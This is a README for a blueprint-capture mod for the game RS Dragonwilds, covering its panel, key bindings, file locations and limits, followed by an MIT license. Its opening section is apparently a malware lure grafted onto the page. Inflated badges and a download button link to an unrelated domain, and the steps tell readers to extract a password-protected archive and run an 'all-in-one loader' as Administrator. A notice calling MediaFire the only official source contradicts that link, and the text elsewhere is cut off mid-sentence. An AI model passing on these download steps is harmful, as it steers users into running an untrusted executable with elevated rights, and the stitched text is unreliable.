<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Install

1. Install **UE4SS v3.0.1** for Dragonwilds
## Use

Press **N** to open the **blueprints panel**. It lists every blueprint with
its piece count, those placed in the current world first (marked with the map
icon); hover one for its details. Clicking a row **pins** that blueprint (the
gold one) and the buttons along the bottom act on it; clicking it again unpins
it.

| Button | Does |
|---|---|
| **CAPTURE** | Enters capture mode: the structure nearest you (within 100 m) is highlighted. **N** captures it and asks for a name; **Esc** cancels. |
| **REPLAY** | **IN PLACE** lays ghosts exactly where the blueprint was captured. **PLACE** enters placement mode (below). |
| **RENAME** | Renames the blueprint (**Enter** confirms). Its placements keep up with the new name. |
| **PLACEMENTS** | Lists everywhere this blueprint stands in the current world, with **REMOVE** (shows what will go and asks you to **CONFIRM**), **WAYPOINT** (marks it on your compass) and **FORGET** for each. |
| **DETAILS** | The blueprint's pieces by kind and everything it takes to build, material by material. |

**Esc** or **N** closes the panel. The mod's keys are also listed in the
game's **Settings > Controls**, below its own key bindings, and that is where
### Where your blueprints are

`%LOCALAPPDATA%\RSDragonwilds\Saved\WildPlans\`

- `blueprints\`: one `.wplan` file per blueprint, plain text. Share one by
  copying the file.
- `blueprints\placements.txt`: where each blueprint has been placed, used by
  PLACEMENTS.
- `keys.txt`: your keys, if you changed any.
- `logs\`: what the mod did. Attach these (and `ue4ss\UE4SS.log`) to a bug
  report.

### Changing the keys

If a key clashes with another mod, change it in the game's **Settings >
Controls**: scroll to **WILDPLANS (MOD)**, click a bright row (**Open /
Close**, real pieces, snap, or the two shortcuts), and press the new key in
the game's "Press any key" box. It works at once; no restart.

- Any letter, **0-9** and **F1-F12** work, alone or with **Ctrl**, **Alt**
  or **Shift**. If the game already uses the key, the box names its action
  and asks you to press the key again to use it anyway (both then respond). A
  key another WildPlans action or another mod already uses is refused.
- **Esc** cancels. The panel key (**Open / Close**) also captures and places
  in the modes, so those rows show it too.
- Your choice is saved in `keys.txt` (above), which you can also edit by
  hand; delete it to go back to the defaults. Esc and the mouse-wheel keys are
  fixed.

### Keys and console commands (optional)

The panel covers everything, so you don't need these. They are there for
anyone who prefers them:

| Key | Does |
|---|---|
| `Ctrl+F3` | capture mode (the panel's **CAPTURE**) |
| `Ctrl+F4` | placement mode for the pinned blueprint (**REPLAY** > **PLACE**) |

## Limits

- **Only player building pieces** are captured. The game's world props and
  terrain are not.
- **Real placement:** `O` works in Creative worlds only. Elsewhere, place
  ghosts and build them from the build menu as normal.
- **Game updates** can change piece data. If the panel or placement stops
  working after a patch, check for a new WildPlans release.
- **Servers:** the mod runs on your client only; nothing is installed on the
  server. On a dedicated server everything above works (tested: capture, ghost
  and real placement, a 464-piece placement, undo, and all of it again after a
  server restart). Two things differ from solo: undo and IN PLACE only see
  pieces near you, and the server saves every 5 minutes, so something placed
  just before a server restart can be lost.
- **Several servers:** the mod cannot tell servers apart, so PLACEMENTS shows
  the placements you made on all of them. Removing one only removes pieces that
  match it exactly, piece by piece and position by position, and asks first.
- **Not yet tested:** several players building on one server, and co-op
  hosted by a player.


---

MIT License

Copyright (c) 2026 kaedon78

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
